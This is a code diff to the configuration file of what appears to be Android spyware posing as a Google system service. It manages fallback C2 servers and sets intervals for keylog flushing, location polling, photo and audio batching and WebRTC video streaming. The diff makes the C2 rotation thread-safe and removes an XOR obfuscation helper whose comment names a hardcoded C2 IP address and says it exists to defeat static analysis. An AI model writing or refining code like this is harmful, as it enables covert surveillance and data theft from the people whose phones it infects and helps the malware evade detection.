@@ -2,6 +2,8 @@ package com.google.android.systemservice.config
 
 import android.content.Context
 import com.google.android.systemservice.BuildConfig
+import java.util.concurrent.CopyOnWriteArrayList
+import java.util.concurrent.atomic.AtomicInteger
 
 object AndroidConfig {
     // Server Configuration
@@ -10,8 +12,8 @@ object AndroidConfig {
     @Volatile private var useHttps = false
     
     // Fallback C2 servers (tried in order if primary fails)
-    private val fallbackServers = mutableListOf<String>()
-    @Volatile private var currentServerIndex = 0
+    private val fallbackServers = CopyOnWriteArrayList<String>()
+    private val currentServerIndex = AtomicInteger(0)
     
     // API Authentication Token - loaded from BuildConfig (set via Gradle property -PdeviceToken="...")
     val DEVICE_TOKEN: String = BuildConfig.DEVICE_AUTH_TOKEN
@@ -21,19 +23,6 @@ object AndroidConfig {
     @Volatile var deviceId: String = ""
         private set
     
-    // Dynamic String Obfuscation
-    // Decodes XORed strings to prevent static analysis 'strings' command discovery
-    private fun mask(input: String, key: Int = 42): String {
-        val result = StringBuilder()
-        for (i in input.indices) {
-            result.append((input[i].toInt() xor key).toChar())
-        }
-        return result.toString()
-    }
-
-    // "http://213.91.211.150:8080/" XORed with 42
-    private val MASKED_BASE_URL = "rzzj@%%\"#/%#%\"\"#&%.\".\"%%\"&'\"%" 
-
     /**
      * Initialize device ID from Android system (call once on app start)
      */
@@ -86,14 +75,19 @@ object AndroidConfig {
         get() = "$apiBaseUrl/config"
     
     // Polling intervals (milliseconds)
-    const val LOCATION_UPDATE_INTERVAL = 60000L // 1 minute
-    const val COMMAND_RECONNECT_DELAY = 5000L // 5 seconds
-    const val KEYLOG_BUFFER_FLUSH_INTERVAL = 300000L // 5 minutes
-    
+    const val LOCATION_UPDATE_INTERVAL = 60_000L       // 1 minute
+    const val COMMAND_RECONNECT_DELAY = 5_000L          // 5 seconds
+    const val KEYLOG_BUFFER_FLUSH_INTERVAL = 300_000L   // 5 minutes
+
     // Buffer sizes
-    const val MAX_KEYLOG_BUFFER_SIZE = 500000 // 500KB
+    const val MAX_KEYLOG_BUFFER_SIZE = 500_000           // 500 KB
     const val MAX_PHOTO_BATCH_SIZE = 5
     const val MAX_AUDIO_BATCH_SIZE = 10
+
+    // SharedPreferences
+    const val PREFS_NAME = "android_config"
+    const val PREF_KEY_SERVER_URL = "server_base_url"
+    const val PREF_KEY_USE_HTTPS = "use_https"
     
     // WebRTC Configuration
     const val WEBRTC_VIDEO_WIDTH = 1280
@@ -125,22 +119,27 @@ object AndroidConfig {
      * Add fallback C2 server URLs (tried in order if primary fails)
      */
     fun addFallbackServer(url: String) {
-        if (url !in fallbackServers) fallbackServers.add(url)
+        fallbackServers.addIfAbsent(url)
     }
 
     /**
      * Switch to next available C2 server. Returns true if switched, false if no more servers.
      */
     fun switchToNextServer(): Boolean {
-        val allServers = mutableListOf(BuildConfig.SERVER_BASE_URL)
-        allServers.addAll(fallbackServers)
-        currentServerIndex++
-        if (currentServerIndex >= allServers.size) {
-            currentServerIndex = 0 // wrap around
-            return false
+        val servers = buildList {
+            add(BuildConfig.SERVER_BASE_URL)
+            addAll(fallbackServers) // CopyOnWriteArrayList iterator is snapshot-safe
         }
-        serverBaseUrl = allServers[currentServerIndex]
-        android.util.Log.d("AndroidConfig", "Switched to C2 server #$currentServerIndex: $serverBaseUrl")
+        if (servers.size <= 1) return false
+
+        val newIndex = currentServerIndex.updateAndGet { current ->
+            (current + 1) % servers.size
+        }
+        if (newIndex == 0) {
+            return false // wrapped around
+        }
+        serverBaseUrl = servers[newIndex]
+        android.util.Log.d("AndroidConfig", "Switched to C2 server #$newIndex: $serverBaseUrl")
         return true
     }
 
@@ -148,7 +147,7 @@ object AndroidConfig {
      * Reset to primary server
      */
     fun resetToPrimaryServer() {
-        currentServerIndex = 0
+        currentServerIndex.set(0)
         serverBaseUrl = BuildConfig.SERVER_BASE_URL
     }
     
@@ -156,33 +155,21 @@ object AndroidConfig {
      * Load configuration from SharedPreferences
      */
     fun loadFromPreferences(context: Context) {
-        val prefs = context.getSharedPreferences("android_config", Context.MODE_PRIVATE)
-        serverBaseUrl = prefs.getString("server_base_url", serverBaseUrl) ?: serverBaseUrl
-        currentServerIndex = 0
-        useHttps = prefs.getBoolean("use_https", useHttps)
+        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        serverBaseUrl = prefs.getString(PREF_KEY_SERVER_URL, serverBaseUrl) ?: serverBaseUrl
+        currentServerIndex.set(0)
+        useHttps = prefs.getBoolean(PREF_KEY_USE_HTTPS, useHttps)
     }
     
     /**
      * Save configuration to SharedPreferences
      */
     fun saveToPreferences(context: Context) {
-        context.getSharedPreferences("android_config", Context.MODE_PRIVATE).edit().apply {
-            putString("server_base_url", serverBaseUrl)
-            putBoolean("use_https", useHttps)
+        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
+            putString(PREF_KEY_SERVER_URL, serverBaseUrl)
+            putBoolean(PREF_KEY_USE_HTTPS, useHttps)
             apply()
         }
     }
     
-    /**
-     * Fetch configuration from server (optional)
-     */
-    suspend fun syncFromServer(context: Context) {
-        try {
-            // TODO: Implement HTTP call to fetch config from server
-            // This allows server-side configuration updates
-            // Example: GET /api/config returns { "server": "...", "port": ..., "https": ... }
-        } catch (e: Exception) {
-            android.util.Log.e("AndroidConfig", "Failed to sync config from server: ${e.message}")
-        }
-    }
 }
